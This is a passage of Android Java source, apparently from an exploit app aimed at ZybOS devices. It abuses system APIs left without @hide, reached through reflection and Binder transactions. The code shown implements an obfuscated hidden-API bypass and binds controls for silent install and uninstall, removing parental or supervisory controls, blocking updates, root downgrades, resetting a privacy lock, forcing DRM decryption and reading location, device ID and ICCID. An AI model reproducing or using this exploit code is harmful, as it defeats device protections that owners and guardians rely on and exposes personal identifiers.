package com.jck.promax;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.ContentValues;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;

import org.json.JSONObject;

/**
 * Zybos系统工具页面 - 基于 JC Code V3 (完整版)
 * 
 * 漏洞原理: android.os.ZybosSysApiManager 中未对关键函数添加 @hide 注解，
 * 通过反射可直接调用系统级API。
 * 
 * 完整功能列表（参考 JC Code V3）:
 * 1.  安装APK - 扫描/选择文件/手动路径静默安装
 * 2.  静默卸载 - 从应用列表选择或手动输入包名/应用名卸载
 * 3.  解除管控 - 三通道清除限制(反射+云端配置+SuperviseProvider)
 * 4.  取消更新 - 阻止系统更新
 * 5.  直链安装 - 下载APK计算MD5后通过广播安装
 * 6.  管控探针 - 扫描SuperviseProvider所有路径
 * 7.  OTA管理 - 扫描OTA Provider配置
 * 8.  开发者入口 - 免Root开开发者/进入验证框/Root一键开启
 * 9.  开发者磁贴 - 跳转ZybSettings开发者磁贴配置
 * 10. 后台管控 - DuraSpeed白名单/抑制/状态
 * 11. 系统应用卸载 - Root方式卸载系统应用
 * 12. 降级安装 - Root方式pm install -d -r降级安装
 * 13. 清除appstore卡住 - force-stop+清缓存+取消广播
 * 14. 降级zpusercenter - 特定降级个人中心
 * 
 * 注意: 此功能仅在ZybOS系统上有效，需要zybos_manager系统服务存在
 */
public class ZybosToolsActivity extends Activity {

    private Button backBtn;
    private Button detectBtn;
    private TextView statusText;
    private android.widget.LinearLayout logPanel;
    private ScrollView logScroll;
    private TextView logText;
    private boolean logPanelVisible = false;

    private final java.util.ArrayList<String> logHistory = new java.util.ArrayList<>();
    private static final int MAX_LOG_LINES = 200;

    // Zybos系统服务相关
    private static Object zybosService;
    private static IBinder zybosBinder;
    private static Class<?> zybosCls;
    private static boolean zybosAvailable = false;
    private Method uncheckedMethod = null;

    // zybos_process 进程管理服务相关 (ZybosProcessManagerService)
    private static Object zybosProcessService;
    private static Class<?> zybosProcessCls;
    private static boolean zybosProcessAvailable = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_zybos_tools);

        initViews();
        setupListeners();
        appendLog("=== Zybos系统工具 v7.4 (MTK Framework Services) ===");
        appendLog("基于 framework 反编译, 全部42个事务码已集成");
        appendLog("使用 IBinder.transact() 直接调用, 绕过 Hidden API");
        appendLog("正在检测ZybosSysApiManager...");

        // 自动检测
        detectZybosService();
    }

    private void initViews() {
        backBtn = findViewById(R.id.backBtn);
        detectBtn = findViewById(R.id.detectBtn);
        statusText = findViewById(R.id.statusText);
        logPanel = findViewById(R.id.logPanel);
        logScroll = findViewById(R.id.logScroll);
        logText = findViewById(R.id.logText);
    }

    private void setupListeners() {
        backBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { finish(); }
        });

        detectBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                toggleLogPanel();
            }
        });

        Button btnClearLog = findViewById(R.id.btnClearLog);
        Button btnHideLog = findViewById(R.id.btnHideLog);
        if (btnClearLog != null) {
            btnClearLog.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    synchronized (logHistory) { logHistory.clear(); }
                    updateLogDisplay();
                }
            });
        }
        if (btnHideLog != null) {
            btnHideLog.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) {
                    toggleLogPanel();
                }
            });
        }

        // 快捷方式/Intent 按钮
        bindBtn(R.id.btnOpenShortcut, new Runnable() { public void run() { doOpenShortcut(); } });
        bindBtn(R.id.btnIntentOpen, new Runnable() { public void run() { doIntentOpen(); } });

        // 功能按钮绑定
        bindBtn(R.id.btnSilentInstall, new Runnable() { public void run() { doSelectInstall(); } });
        bindBtn(R.id.btnUninstall, new Runnable() { public void run() { doUninstall(); } });
        bindBtn(R.id.btnDisableParental, new Runnable() { public void run() { doDisableParental(); } });
        bindBtn(R.id.btnCancelUpdate, new Runnable() { public void run() { doCancelUpdate(); } });
        bindBtn(R.id.btnDirectUrl, new Runnable() { public void run() { doDirectUrlInstall(); } });
        bindBtn(R.id.btnSupervise, new Runnable() { public void run() { doSuperviseProbe(); } });
        bindBtn(R.id.btnOta, new Runnable() { public void run() { doOtaManager(); } });
        bindBtn(R.id.btnDevEntry, new Runnable() { public void run() { doDevEntry(); } });
        bindBtn(R.id.btnDevTile, new Runnable() { public void run() { doDevTile(); } });
        bindBtn(R.id.btnBgMgr, new Runnable() { public void run() { doBgManager(); } });
        bindBtn(R.id.btnSysUninstall, new Runnable() { public void run() { doSysAppUninstall(); } });
        bindBtn(R.id.btnDowngrade, new Runnable() { public void run() { doRootDowngrade(); } });
        bindBtn(R.id.btnClearAppstore, new Runnable() { public void run() { clearAppstoreStuck(); } });
        bindBtn(R.id.btnDowngradeZpuc, new Runnable() { public void run() { doDowngradeZpUserCenter(); } });

        // === 分类1: 安装管理 ===
        bindBtn(R.id.btnIsSilentInstallDisallow, new Runnable() { public void run() { doIsSilentInstallDisallow(); } });
        bindBtn(R.id.btnIsDisallowInstallPackage, new Runnable() { public void run() { doIsDisallowInstallPackage(); } });

        // === 分类2: 包名/类名管控 ===
        bindBtn(R.id.btnSetClassListAllow, new Runnable() { public void run() { doSetClassListAllow(); } });
        bindBtn(R.id.btnIsDisallowPackage, new Runnable() { public void run() { doIsDisallowPackage(); } });
        bindBtn(R.id.btnIsDisallowClass, new Runnable() { public void run() { doIsDisallowClass(); } });
        bindBtn(R.id.btnIsAllowClass, new Runnable() { public void run() { doIsAllowClass(); } });

        // === 分类3: 系统控制 ===
        bindBtn(R.id.btnLockScreen, new Runnable() { public void run() { doLockScreen(); } });
        bindBtn(R.id.btnIsDisallowUSB, new Runnable() { public void run() { doIsDisallowUSB(); } });
        bindBtn(R.id.btnDisableNami, new Runnable() { public void run() { doDisableNami(); } });
        bindBtn(R.id.btnIsAdbEnabled, new Runnable() { public void run() { doIsAdbEnabled(); } });

        // === 分类4: 显示设置 ===
        bindBtn(R.id.btnSetNightDisplayOn, new Runnable() { public void run() { doSetNightDisplayActivated(); } });
        bindBtn(R.id.btnSetNightColorTemp, new Runnable() { public void run() { doSetNightDisplayColorTemp(); } });
        bindBtn(R.id.btnGetNightColorTemp, new Runnable() { public void run() { doGetNightDisplayColorTemp(); } });
        bindBtn(R.id.btnIsNightDisplayOn, new Runnable() { public void run() { doIsNightDisplayActivated(); } });
        bindBtn(R.id.btnSetDefaultBrowser, new Runnable() { public void run() { doSetDefaultBrowser(); } });

        // === 分类5: 电池/硬件 ===
        bindBtn(R.id.btnGetChargerIbat, new Runnable() { public void run() { doGetChargerIbat(); } });
        bindBtn(R.id.btnGetBatteryAging, new Runnable() { public void run() { doGetBatteryAgingFactor(); } });
        bindBtn(R.id.btnGetBatteryCycle, new Runnable() { public void run() { doGetBatteryCycleCount(); } });
        bindBtn(R.id.btnGetBatteryHealth, new Runnable() { public void run() { doGetBatteryHealth(); } });
        bindBtn(R.id.btnGetHardwareCompAll, new Runnable() { public void run() { doGetAllHardwareComp(); } });

        // === 分类6: sysfs读取 ===
        bindBtn(R.id.btnGetSysfsControl, new Runnable() { public void run() { doGetSysfsControl(); } });

        // === 分类7: 免打扰 ===
        bindBtn(R.id.btnAddInDndList, new Runnable() { public void run() { doAddInDndList(); } });
        bindBtn(R.id.btnRemoveFromDndList, new Runnable() { public void run() { doRemoveFromDndList(); } });
        bindBtn(R.id.btnIsInDndList, new Runnable() { public void run() { doIsInDndList(); } });

        // === 分类8: 网络/DNS ===
        bindBtn(R.id.btnSetZybOsDnsDotMode, new Runnable() { public void run() { doSetZybOsDnsDotMode(); } });
        bindBtn(R.id.btnGetZybOsDnsDotMode, new Runnable() { public void run() { doGetZybOsDnsDotMode(); } });

        // === 分类9: 定时开关机 ===
        bindBtn(R.id.btnUpdatePowerOnTime, new Runnable() { public void run() { doUpdatePowerOnTime(); } });
        bindBtn(R.id.btnSendLowChargingNotif, new Runnable() { public void run() { doSendLowChargingNotification(); } });
        bindBtn(R.id.btnCancelLowChargingNotif, new Runnable() { public void run() { doCancelLowChargingNotification(); } });

        // === 分类10: 进程管理 ===
        bindBtn(R.id.btnForceStopPackage, new Runnable() { public void run() { doForceStopPackage(); } });
        bindBtn(R.id.btnInWhiteList, new Runnable() { public void run() { doInWhiteList(); } });

        // === 新增: 缺失事务码按钮 ===
        // 分类1: 安装管理
        bindBtn(R.id.btnSetInstallPackageDisallow, new Runnable() { public void run() { doSetInstallPackageDisallow(); } });
        bindBtn(R.id.btnSetPackageListDisallow, new Runnable() { public void run() { doSetPackageListDisallow(); } });
        // 分类2: 包名/类名管控
        bindBtn(R.id.btnSetClassListDisallow, new Runnable() { public void run() { doSetClassListDisallow(); } });
        // 分类3: 系统控制
        bindBtn(R.id.btnSetUSBDisallow, new Runnable() { public void run() { doSetUSBDisallow(); } });
        // 分类4: 显示设置
        bindBtn(R.id.btnSetDisplayDaltonizer, new Runnable() { public void run() { doSetDisplayDaltonizerEnabled(); } });
        bindBtn(R.id.btnIsInDisplayDaltonizer, new Runnable() { public void run() { doIsInDisplayDaltonizerMode(); } });
        bindBtn(R.id.btnSetStylusEnabled, new Runnable() { public void run() { doSetStylusEnabled(); } });
        bindBtn(R.id.btnSetMtkPQColorTemp, new Runnable() { public void run() { doSetMtkPQColorTemperatureEnable(); } });
        bindBtn(R.id.btnSetMtkPQGammaIndex, new Runnable() { public void run() { doSetMtkPQGammaIndex(); } });
        bindBtn(R.id.btnGetMtkPQGammaDefault, new Runnable() { public void run() { doGetMtkPQGammaDefaultValue(); } });
        bindBtn(R.id.btnGetMtkPQGammaMin, new Runnable() { public void run() { doGetMtkPQGammaMinValue(); } });
        bindBtn(R.id.btnGetMtkPQGammaMax, new Runnable() { public void run() { doGetMtkPQGammaMaxValue(); } });
        bindBtn(R.id.btnGetMtkPQGammaCurrent, new Runnable() { public void run() { doGetMtkPQGammaCurrentValue(); } });
        // 分类5: 电池/硬件
        bindBtn(R.id.btnGetChargerAgingCV, new Runnable() { public void run() { doGetChargerAgingCV(); } });
        bindBtn(R.id.btnSetChargerAgingCV, new Runnable() { public void run() { doSetChargerAgingCV(); } });
        bindBtn(R.id.btnSetChargerIeoc, new Runnable() { public void run() { doSetChargerIeoc(); } });

        // === 高级: Binder事务码 ===
        bindBtn(R.id.btnTransactProbe, new Runnable() { public void run() { doTransactProbe(); } });
        bindBtn(R.id.btnManualTransact, new Runnable() { public void run() { doManualTransact(); } });
        // === 分类11: 框架新发现接口 ===
        bindBtn(R.id.btnCapCtrlDetect, new Runnable() { public void run() { doCapCtrlDetect(); } });
        bindBtn(R.id.btnCapCtrlEnable, new Runnable() { public void run() { doCapCtrlEnable(); } });
        bindBtn(R.id.btnCustomPropBrowser, new Runnable() { public void run() { doCustomPropBrowser(); } });
        bindBtn(R.id.btnCustomPropRelease, new Runnable() { public void run() { doCustomPropRelease(); } });

        // === 分类12: MTK Framework Services (基于ZybOS研究) ===
        // PowerHalMgr
        bindBtn(R.id.btnPowerHalDetect, new Runnable() { public void run() { doPowerHalDetect(); } });
        bindBtn(R.id.btnPowerHalPerfLock, new Runnable() { public void run() { doPowerHalPerfLock(); } });
        bindBtn(R.id.btnPowerHalPerfRelease, new Runnable() { public void run() { doPowerHalPerfRelease(); } });
        bindBtn(R.id.btnPowerHalSetPriority, new Runnable() { public void run() { doPowerHalSetPriority(); } });
        bindBtn(R.id.btnPowerHalQuerySysInfo, new Runnable() { public void run() { doPowerHalQuerySysInfo(); } });
        bindBtn(R.id.btnPowerHalFlushRules, new Runnable() { public void run() { doPowerHalFlushRules(); } });
        // Omadm
        bindBtn(R.id.btnOmadmDetect, new Runnable() { public void run() { doOmadmDetect(); } });
        bindBtn(R.id.btnOmadmGetDeviceId, new Runnable() { public void run() { doOmadmGetDeviceId(); } });
        bindBtn(R.id.btnOmadmGetIccid, new Runnable() { public void run() { doOmadmGetIccid(); } });
        bindBtn(R.id.btnOmadmReadFile, new Runnable() { public void run() { doOmadmReadFile(); } });
        // AnrManager
        bindBtn(R.id.btnAnrDetect, new Runnable() { public void run() { doAnrDetect(); } });
        bindBtn(R.id.btnAnrStringToFile, new Runnable() { public void run() { doAnrStringToFile(); } });
        // MTK服务扫描器
        bindBtn(R.id.btnMtkServiceScanner, new Runnable() { public void run() { doMtkServiceScanner(); } });
        // ============ 新漏洞利用 (分类13-17) ============
        // DuraSpeed
        bindBtn(R.id.btnDuraDetect, new Runnable() { public void run() { doDuraDetect(); } });
        bindBtn(R.id.btnDuraAddWhitelist, new Runnable() { public void run() { doDuraAddWhitelist(); } });
        bindBtn(R.id.btnDuraGetWhitelist, new Runnable() { public void run() { doDuraGetWhitelist(); } });
        bindBtn(R.id.btnDuraSuppress, new Runnable() { public void run() { doDuraSuppress(); } });
        // 系统属性
        bindBtn(R.id.btnSysPropGet, new Runnable() { public void run() { doSysPropGet(); } });
        bindBtn(R.id.btnSysPropSet, new Runnable() { public void run() { doSysPropSet(); } });
        bindBtn(R.id.btnSysPropTcpLog, new Runnable() { public void run() { doSysPropTcpLog(); } });
        bindBtn(R.id.btnSysPropDropCaches, new Runnable() { public void run() { doSysPropDropCaches(); } });
        bindBtn(R.id.btnSysPropAnrFlow, new Runnable() { public void run() { doSysPropAnrFlow(); } });
        bindBtn(R.id.btnSysPropDisableCta, new Runnable() { public void run() { doSysPropDisableCta(); } });
        // SettingsProvider
        bindBtn(R.id.btnSettGet, new Runnable() { public void run() { doSettGet(); } });
        bindBtn(R.id.btnSettPut, new Runnable() { public void run() { doSettPut(); } });
        bindBtn(R.id.btnSettEnableAdb, new Runnable() { public void run() { doSettEnableAdb(); } });
        bindBtn(R.id.btnSettDisableAdb, new Runnable() { public void run() { doSettDisableAdb(); } });
        // 广播/服务利用
        bindBtn(R.id.btnEnableUsbTether, new Runnable() { public void run() { doEnableUsbTether(); } });
        bindBtn(R.id.btnDisableStatusBar, new Runnable() { public void run() { doDisableStatusBar(); } });
        bindBtn(R.id.btnResetPrivacyLock, new Runnable() { public void run() { doResetPrivacyLock(); } });
        bindBtn(R.id.btnGetLocation, new Runnable() { public void run() { doGetLocation(); } });
        bindBtn(R.id.btnSetSearchEngine, new Runnable() { public void run() { doSetSearchEngine(); } });
        bindBtn(R.id.btnSetAutoBoot, new Runnable() { public void run() { doSetAutoBoot(); } });
        bindBtn(R.id.btnForceDecryptDrm, new Runnable() { public void run() { doForceDecryptDrm(); } });
        bindBtn(R.id.btnSetEthernet, new Runnable() { public void run() { doSetEthernet(); } });
        // 高级服务利用
        bindBtn(R.id.btnPowerHalHint, new Runnable() { public void run() { doPowerHalHint(); } });
        bindBtn(R.id.btnPowerHalGetCpu, new Runnable() { public void run() { doPowerHalGetCpu(); } });
        bindBtn(R.id.btnDataShaping, new Runnable() { public void run() { doDataShaping(); } });
        bindBtn(R.id.btnLoaderProxy, new Runnable() { public void run() { doLoaderProxy(); } });
        bindBtn(R.id.btnAdvCamParam, new Runnable() { public void run() { doAdvCamParam(); } });
        bindBtn(R.id.btnVoiceWakeup, new Runnable() { public void run() { doVoiceWakeup(); } });
        bindBtn(R.id.btnBluetoothMesh, new Runnable() { public void run() { doBluetoothMesh(); } });
        bindBtn(R.id.btnOmadmWriteFile, new Runnable() { public void run() { doOmadmWriteFile(); } });
    }

    private void bindBtn(int id, final Runnable action) {
        View v = findViewById(id);
        if (v != null) {
            v.setOnClickListener(new View.OnClickListener() {
                @Override public void onClick(View v) { action.run(); }
            });
        }
    }

    // ==================== 核心: Hidden API Bypass ====================

    private boolean bypassHiddenApi() {
        // 方式1: LSPosed HiddenApiBypass
        try {
            Class.forName(Obfuscator.dec3(new byte[]{(byte)0xdb, (byte)0x5f, (byte)0x70, (byte)0x9a, (byte)0x41, (byte)0x64, (byte)0xc4, (byte)0x42, (byte)0x64, (byte)0xd1, (byte)0x49, (byte)0x39, (byte)0xdc, (byte)0x44, (byte)0x73, (byte)0xd0, (byte)0x48, (byte)0x79, (byte)0xd5, (byte)0x5d, (byte)0x7e, (byte)0xd6, (byte)0x54, (byte)0x67, (byte)0xd5, (byte)0x5e, (byte)0x64, (byte)0x9a, (byte)0x65, (byte)0x7e, (byte)0xd0, (byte)0x49, (byte)0x72, (byte)0xda, (byte)0x6c, (byte)0x67, (byte)0xdd, (byte)0x6f, (byte)0x6e, (byte)0xc4, (byte)0x4c, (byte)0x64, (byte)0xc7}, (byte)0xb4, (byte)0x2d, (byte)0x17))
                .getMethod(Obfuscator.dec(new byte[]{(byte)0x49, (byte)0x4c, (byte)0x4c, (byte)0x60, (byte)0x41, (byte)0x4c, (byte)0x4c, (byte)0x4d, (byte)0x46, (byte)0x69, (byte)0x58, (byte)0x41, (byte)0x6d, (byte)0x50, (byte)0x4d, (byte)0x45, (byte)0x58, (byte)0x5c, (byte)0x41, (byte)0x47, (byte)0x46, (byte)0x5b}, (byte)0x28), String[].class)
                .invoke(null, (Object) new String[]{"L"});
            appendLog("[+] Hidden API bypass: LSPosed 成功");
            return true;
        } catch (Throwable e) {
            // 继续尝试其他方式
        }

        // 方式2: VMRuntime.setHiddenApiExemptions
        try {
            Class<?> vmr = Class.forName(Obfuscator.dec3(new byte[]{(byte)0xaa, (byte)0x36, (byte)0x23, (byte)0xb8, (byte)0x3e, (byte)0x24, (byte)0xe0, (byte)0x24, (byte)0x36, (byte)0xbd, (byte)0x23, (byte)0x2a, (byte)0xa3, (byte)0x79, (byte)0x19, (byte)0x83, (byte)0x05, (byte)0x3a, (byte)0xa0, (byte)0x23, (byte)0x26, (byte)0xa3, (byte)0x32}, (byte)0xce, (byte)0x57, (byte)0x4f));
            Method getRuntime = vmr.getDeclaredMethod(Obfuscator.dec(new byte[]{(byte)0x15, (byte)0x17, (byte)0x06, (byte)0x20, (byte)0x07, (byte)0x1c, (byte)0x06, (byte)0x1b, (byte)0x1f, (byte)0x17}, (byte)0x72));
            getRuntime.setAccessible(true);
            Object runtime = getRuntime.invoke(null);

            try {
                Method setExempt = vmr.getDeclaredMethod(Obfuscator.dec(new byte[]{(byte)0x5a, (byte)0x4c, (byte)0x5d, (byte)0x61, (byte)0x40, (byte)0x4d, (byte)0x4d, (byte)0x4c, (byte)0x47, (byte)0x68, (byte)0x59, (byte)0x40, (byte)0x6c, (byte)0x51, (byte)0x4c, (byte)0x44, (byte)0x59, (byte)0x5d, (byte)0x40, (byte)0x46, (byte)0x47, (byte)0x5a}, (byte)0x29), String[].class);
                setExempt.setAccessible(true);
                setExempt.invoke(runtime, (Object) new String[]{"L"});
                appendLog("[+] Hidden API bypass: setHiddenApiExemptions 成功");
                return true;
            } catch (NoSuchMethodException e2) {
                // 方式3: disableHiddenApiRestrictions
                try {
                    Method disable = vmr.getDeclaredMethod(Obfuscator.dec(new byte[]{(byte)0x08, (byte)0x05, (byte)0x1f, (byte)0x0d, (byte)0x0e, (byte)0x00, (byte)0x09, (byte)0x24, (byte)0x05, (byte)0x08, (byte)0x08, (byte)0x09, (byte)0x02, (byte)0x2d, (byte)0x1c, (byte)0x05, (byte)0x3e, (byte)0x09, (byte)0x1f, (byte)0x18, (byte)0x1e, (byte)0x05, (byte)0x0f, (byte)0x18, (byte)0x05, (byte)0x03, (byte)0x02, (byte)0x1f}, (byte)0x6c));
                    disable.setAccessible(true);
                    disable.invoke(runtime);
                    appendLog("[+] Hidden API bypass: disableHiddenApiRestrictions 成功");
                    return true;
                } catch (NoSuchMethodException e3) {
                    // 继续
                }
            }
        } catch (Throwable e5) {
            // 继续
        }

        // 方式4: getDeclaredMethodsUnchecked (Android 11+)
        try {
            Method getDeclaredMethod = Class.class.getDeclaredMethod(Obfuscator.dec(new byte[]{(byte)0x8e, (byte)0x8c, (byte)0x9d, (byte)0xad, (byte)0x8c, (byte)0x8a, (byte)0x85, (byte)0x88, (byte)0x9b, (byte)0x8c, (byte)0x8d, (byte)0xa4, (byte)0x8c, (byte)0x9d, (byte)0x81, (byte)0x86, (byte)0x8d}, (byte)0xe9), String.class, Class[].class);
            Method unchecked = (Method) getDeclaredMethod.invoke(Class.class, Obfuscator.dec(new byte[]{(byte)0x0e, (byte)0x0c, (byte)0x1d, (byte)0x2d, (byte)0x0c, (byte)0x0a, (byte)0x05, (byte)0x08, (byte)0x1b, (byte)0x0c, (byte)0x0d, (byte)0x24, (byte)0x0c, (byte)0x1d, (byte)0x01, (byte)0x06, (byte)0x0d, (byte)0x1a, (byte)0x3c, (byte)0x07, (byte)0x0a, (byte)0x01, (byte)0x0c, (byte)0x0a, (byte)0x02, (byte)0x0c, (byte)0x0d}, (byte)0x69), new Class[]{Boolean.TYPE});
            if (unchecked != null) {
                unchecked.setAccessible(true);
                this.uncheckedMethod = unchecked;
                appendLog("[+] Hidden API bypass: getDeclaredMethodsUnchecked 成功");
                return true;
            }
        } catch (Throwable e4) {
            // 继续
        }

        // 方式5: Unsafe 内存操作已移除（Android 12+ 上可能导致 ART native crash）

        // 方式6: 通过 PackageInfo 获取 hidden api 豁免
        try {
            getPackageManager().getPackageInfo(getPackageName(), 0);
            appendLog("[!] Hidden API bypass: 未找到有效方式，尝试受限反射...");
        } catch (Throwable e6) {
            // ignore
        }

        appendLog("[!] Hidden API bypass: 所有方式失败，反射可能受限");
        return false;
    }

    // ==================== 检测Zybos服务 ====================

    private void detectZybosService() {
        appendLog("---------- 检测Zybos服务 ----------");
        statusText.setText("状态: 检测中...");
        statusText.setTextColor(0xFFFF9800);

        // 在后台线程执行所有反射和Binder操作，避免ANR
        runAsync(new Runnable() {
            @Override
            public void run() {
        zybosAvailable = false;
        zybosService = null;
        zybosCls = null;
        uncheckedMethod = null;

        // 0. Hidden API Bypass
        boolean bypassOk = bypassHiddenApi();
        if (!bypassOk) {
            appendLog("[!] Hidden API bypass 全部失败，继续尝试...");
        }

        try {
            // 1. 尝试获取zybos_manager系统服务（多种方式）
            String[] serviceNames = {Obfuscator.dec(new byte[]{(byte)0xe6, (byte)0xe5, (byte)0xfe, (byte)0xf3, (byte)0xef, (byte)0xc3, (byte)0xf1, (byte)0xfd, (byte)0xf2, (byte)0xfd, (byte)0xfb, (byte)0xf9, (byte)0xee}, (byte)0x9c), Obfuscator.dec(new byte[]{(byte)0x06, (byte)0x05, (byte)0x1e, (byte)0x13, (byte)0x0f}, (byte)0x7c), Obfuscator.dec(new byte[]{(byte)0x33, (byte)0x30, (byte)0x2b, (byte)0x26, (byte)0x3a, (byte)0x3a, (byte)0x2c, (byte)0x3b, (byte)0x3f, (byte)0x20, (byte)0x2a, (byte)0x2c}, (byte)0x49), Obfuscator.dec(new byte[]{(byte)0xf9, (byte)0xfa, (byte)0xe1, (byte)0xec, (byte)0xf0, (byte)0xad, (byte)0xf0, (byte)0xfa, (byte)0xf0, (byte)0xe2, (byte)0xf3, (byte)0xea}, (byte)0x83), Obfuscator.dec(new byte[]{(byte)0xdd, (byte)0xde, (byte)0xc5, (byte)0xc8, (byte)0xd4, (byte)0xd4, (byte)0xde, (byte)0xd4, (byte)0xc6, (byte)0xd7, (byte)0xce}, (byte)0xa7)};
            for (String svcName : serviceNames) {
                if (zybosService != null) break;
                try {
                    Class<?> serviceManagerCls = Class.forName(Obfuscator.dec3(new byte[]{(byte)0x2b, (byte)0x5a, (byte)0xa9, (byte)0x38, (byte)0x5b, (byte)0xa4, (byte)0x2e, (byte)0x1a, (byte)0xa2, (byte)0x39, (byte)0x1a, (byte)0x9e, (byte)0x2f, (byte)0x46, (byte)0xbb, (byte)0x23, (byte)0x57, (byte)0xa8, (byte)0x07, (byte)0x55, (byte)0xa3, (byte)0x2b, (byte)0x53, (byte)0xa8, (byte)0x38}, (byte)0x4a, (byte)0x34, (byte)0xcd));
                    Method getServiceMethod = serviceManagerCls.getMethod(Obfuscator.dec(new byte[]{(byte)0xcc, (byte)0xce, (byte)0xdf, (byte)0xf8, (byte)0xce, (byte)0xd9, (byte)0xdd, (byte)0xc2, (byte)0xc8, (byte)0xce}, (byte)0xab), String.class);
                    Object svc = getServiceMethod.invoke(null, svcName);
                    if (svc != null) {
                        zybosService = svc;
                        if (svc instanceof IBinder) {
                            zybosBinder = (IBinder) svc;
                        }
                        appendLog("✓ 服务通过 [" + svcName + "] 获取成功");
                        break;
                    }
                } catch (Throwable e1) {
                    // 继续尝试下一个服务名
                }
            }
            // fallback: getSystemService
            if (zybosService == null) {
                try {
                    Object svc = getSystemService(Obfuscator.dec(new byte[]{(byte)0xe6, (byte)0xe5, (byte)0xfe, (byte)0xf3, (byte)0xef, (byte)0xc3, (byte)0xf1, (byte)0xfd, (byte)0xf2, (byte)0xfd, (byte)0xfb, (byte)0xf9, (byte)0xee}, (byte)0x9c));
                    if (svc != null) {
                        zybosService = svc;
                        if (svc instanceof IBinder) {
                            zybosBinder = (IBinder) svc;
                        }
                    }
                } catch (Throwable e2) {
                    // ignore
                }
            }
            // fallback: root shell 检测服务列表
            if (zybosService == null) {
                appendLog("[*] 尝试通过root检测服务列表...");
                String svcList = execRootCapture("service list | grep -i zybos");
                if (svcList != null && !svcList.isEmpty()) {
                    appendLog("[+] 发现服务: " + svcList.replace("\n", " | "));
                    // 尝试从输出中提取服务名并再次获取
                    String[] lines = svcList.split("\n");
                    for (String line : lines) {
                        if (line.contains(":")) {
                            String possibleName = line.substring(0, line.indexOf(':')).trim();
                            if (!possibleName.isEmpty()) {
                                try {
                                    Class<?> serviceManagerCls = Class.forName(Obfuscator.dec3(new byte[]{(byte)0x2b, (byte)0x5a, (byte)0xa9, (byte)0x38, (byte)0x5b, (byte)0xa4, (byte)0x2e, (byte)0x1a, (byte)0xa2, (byte)0x39, (byte)0x1a, (byte)0x9e, (byte)0x2f, (byte)0x46, (byte)0xbb, (byte)0x23, (byte)0x57, (byte)0xa8, (byte)0x07, (byte)0x55, (byte)0xa3, (byte)0x2b, (byte)0x53, (byte)0xa8, (byte)0x38}, (byte)0x4a, (byte)0x34, (byte)0xcd));
                                    Method getServiceMethod = serviceManagerCls.getMethod(Obfuscator.dec(new byte[]{(byte)0xcc, (byte)0xce, (byte)0xdf, (byte)0xf8, (byte)0xce, (byte)0xd9, (byte)0xdd, (byte)0xc2, (byte)0xc8, (byte)0xce}, (byte)0xab), String.class);
                                    Object svc = getServiceMethod.invoke(null, possibleName);
                                    if (svc != null) {
                                        zybosService = svc;
                                        if (svc instanceof IBinder) {
                                            zybosBinder = (IBinder) svc;
                                        }
                                        appendLog("✓ 通过root发现的服务名 [" + possibleName + "] 获取成功");
                                        break;
                                    }
                                } catch (Throwable e3) {
                                    // ignore
                                }
                            }
                        }
                    }
                }
            }

            if (zybosService == null) {
                appendLog("✗ 所有方式均无法获取zybos服务");
                appendLog("此设备可能不是ZybOS系统，或服务名不同");
                runOnUiThread(new Runnable() {
                    @Override public void run() {
                        statusText.setText("状态: 不可用 (非ZybOS)");
                        statusText.setTextColor(getResources().getColor(R.color.md3_error));
                    }
                });
                return;
            }

            appendLog("✓ zybos_manager服务已获取");
            appendLog("服务类: " + zybosService.getClass().getName());

            // 2. 尝试加载ZybosSysApiManager类（多种方式）
            String[] classNames = {
                Obfuscator.dec3(new byte[]{(byte)0x4a, (byte)0xd0, (byte)0xaa, (byte)0x59, (byte)0xd1, (byte)0xa7, (byte)0x4f, (byte)0x90, (byte)0xa1, (byte)0x58, (byte)0x90, (byte)0x94, (byte)0x52, (byte)0xdc, (byte)0xa1, (byte)0x58, (byte)0xed, (byte)0xb7, (byte)0x58, (byte)0xff, (byte)0xbe, (byte)0x42, (byte)0xf3, (byte)0xaf, (byte)0x45, (byte)0xdf, (byte)0xa9, (byte)0x4e, (byte)0xcc}, (byte)0x2b, (byte)0xbe, (byte)0xce),
                Obfuscator.dec3(new byte[]{(byte)0x94, (byte)0xf2, (byte)0x43, (byte)0x87, (byte)0xf3, (byte)0x4e, (byte)0x91, (byte)0xb2, (byte)0x48, (byte)0x86, (byte)0xb2, (byte)0x7d, (byte)0x8c, (byte)0xfe, (byte)0x48, (byte)0x86, (byte)0xcf, (byte)0x5e, (byte)0x86, (byte)0xdd, (byte)0x57, (byte)0x9c, (byte)0xd1, (byte)0x46, (byte)0x9b, (byte)0xfd, (byte)0x40, (byte)0x90, (byte)0xee, (byte)0x03, (byte)0xa6, (byte)0xe8, (byte)0x52, (byte)0x97}, (byte)0xf5, (byte)0x9c, (byte)0x27),
